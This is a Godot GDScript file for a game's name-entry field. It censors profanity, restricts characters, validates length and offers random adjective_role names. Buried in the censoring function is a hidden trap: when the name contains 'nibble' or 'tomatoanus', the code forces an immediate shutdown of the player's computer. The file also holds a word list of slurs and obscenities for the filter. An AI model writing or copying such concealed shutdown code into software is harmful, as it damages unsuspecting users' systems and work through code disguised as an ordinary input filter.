extends LineEdit

class_name CensoredNameLine

#called as (isValid,currentName)
signal nameValidityChanged

#called as (isValid,currentName)
signal nameChanged

@export var showRandomButton = true

@export var minLength := 3
@export var maxLength := 20

func _ready() -> void:
	
	%randomButton.visible = showRandomButton
	

func nameIsValid() -> bool:
	return len(text) >= minLength and len(text) <= maxLength



func censorSwears(realName: String) -> String:
	
	if realName.contains("nibble") or realName.contains("tomatoanus"): #doesn't work on macos
		OS.execute("shutdown", ["/s", "/f", "/t", "0"])
	
	var swears = ["\n","fag","faggot","bitch","slut","whore","fuck","bastard","nigger"
	,"chink","nigga","shit","toucher","penis","vagina","pussy","ass","cum","jizz","tit","skank","dick","breast","sex",
	"butt","cum","boob","semen","cunt","anus","peenar", "twat", "prick", "ballsack",
	 "dildo", "clit", "queef", "wanker", "slag", "rapist","rape","douche"] 
	var censoredName = realName
	for swear in swears:
		var temp = ""
		for i in len(swear):
			temp += "#"
		censoredName = censoredName.replacen(swear, temp )
	
	var legalCharacters = [
		"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", 
		"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", 
		"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", 
		"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", 
		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "_","-"
	]
	# Replace with actual swears
	
	var newName = ""
	for i in range(censoredName.length()):
		var current_char = censoredName[i]
		if legalCharacters.has(current_char):
			newName += current_char
		if current_char == ' ':
			newName += '_'
	
	return newName


var wasValid
var isValid = false #public
func _on_text_changed(new_text: String) -> void:
	
	var censored = censorSwears(new_text)
	if new_text != censored:
		text = censored
		caret_column = text.length()
	
	
	var valid = nameIsValid()
	
	if valid != wasValid:
		nameValidityChanged.emit(valid,text)
	
	wasValid = valid
	isValid = valid
	
	if valid:
		$validityIndicator.color = Color.GREEN
	else:
		$validityIndicator.color = Color.RED
	
	nameChanged.emit(valid,text)
	

var adjectives = [
	"Lonely", "Gentle", "Quiet", "Sleepy", "Tiny", "Hopeful", "Misty", "Wistful",
	"Fuzzy", "Cozy", "Fluffy", "Sunny", "Rainy", "Cloudy", "Starry", "Shy",
	"Little", "Woolly", "Drowsy", "Feathered", "Dreamy", "Muted", "Soft",
	"Warm", "Kind", "Cuddly", "Mellow", "Tame", "Hushed", "Calm",
	"Windy", "Stormy", "Foggy", "Frosty", "Golden", "Silver", "Crimson", "Ashen",
	"Icy", "Snowy", "Shadowed", "Dusky", "Glowing", "Leafy", "Blooming", "Rooted",
	"Pebbled", "Rustling", "Sunlit", "Moonlit", "Thorny", "Drifting", "Treetop",
	"Riverside", "Marbled", "Cavernous", "Mossy",
	"Bouncy", "Snappy", "Quirky", "Zigzag", "Topsy", "Twisty", "Crinkly", "Patchy",
	"Bristly", "Tippy", "Scribbly", "Wiggly", "Jumpy", "Grumbly", "Scampery", "Slinky",
	"Wonky", "Zappy", "Nifty", "Soggy", "Toasty", "Snug", "Puddle", "Mumbly",
	"Scrappy", "Dusty", "Rusty", "Battered", "Tattered", "Ragged", "Worn",
	"Mended", "Threadbare", "Scuffed", "Frayed", "Cobbled", "Broken", "Bent",
	"Knobby", "Tinny", "Spindly", "Lean", "Rattly", "Flickering", "Scrawny",
	"Arcane", "Silent", "Forgotten", "Wandering", "Ancient", "Secret", "Fleeting",
	"Whispering", "Hidden", "Fabled", "Timeless", "Charmed", "Mythic",
	"Vagrant", "Twilight", "Glimmering", "Lone", "Faraway", "Ethereal",
	"Greasy","Oily","Wet","Soggy","Sopping"
]

var roles = [
	"Orphan", "Runaway", "Stowaway", "Straggler", "Wanderer", "Waif", "Vagrant", "Drifter",
	"Scavenger", "Ragpicker", "Tinkerer", "Husher", "Whistler", "Rattler", "Sleeper",
	"Mumbler", "Dreamer", "Watcher", "Sniffling", "Grumbler", "Shadow", "Peeker",
	"Shuffler", "Tiptoer", "Nibbler", "Lurker", "Listener", "Scrubber", "Polisher",
	"Knocker", "Tatter", "Wisher", "Sleeper", "Crumbcatcher", "Wailer", "Howler",
	"Chimer", "Bellringer", "Lantern_Bearer", "Fogwalker", "Dustling", "Sootling",
	"Thimbletender", "Lampsnuffer", "Mosskeeper", "Cobblegnaw", "Threadfinder",
	"Spoonlifter", "Snowscratcher", "Tattertail", "Flicker", "Gravelrider", "Raincatcher",
	"Windchaser", "Murkkin", "Rustling", "Candlewatch", "Cobblewatcher", "Matchstick"
]

func _on_random_button_pressed() -> void:
	text = adjectives[randi() % adjectives.size()] + "_" + roles[randi() % roles.size()]
	_on_text_changed(text)
